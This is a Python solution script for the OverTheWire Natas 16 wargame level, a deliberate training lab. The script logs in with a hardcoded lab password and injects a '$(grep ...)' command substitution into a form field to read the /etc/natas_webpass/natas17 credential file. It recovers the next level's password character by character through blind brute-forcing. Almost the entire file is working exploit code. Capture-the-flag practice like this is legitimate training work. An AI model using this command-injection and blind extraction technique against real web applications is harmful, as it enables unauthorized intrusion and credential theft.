import requests as req

url = "http://natas16.natas.labs.overthewire.org"
username = "natas16"
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"

chars = ""

for i in range(0, 26):
	chars += chr(ord("A") + i)
	chars += chr(ord("a") + i)

for i in range(0, 10):
	chars += str(i)

passwd = "b" #natas17 password

def test_passwd(username, password, url, passwd):
	query = "zodiac$(grep " + passwd + " /etc/natas_webpass/natas17)"
	r = req.post(url, auth=(username, password), data={"needle": query})
	return "<pre>\n</pre>" in r.text

i = 0
while i < len(chars):
	s = chars[i]
	if test_passwd(username, password, url, passwd + s):
		passwd += s
		i = 0
		continue
	print(passwd)
	i += 1
i = 0
while i < len(chars):
	s = chars[i]
	if test_passwd(username, password, url, s + passwd):
		passwd = s + passwd
		i = 0
		continue
	print(passwd)
	i += 1
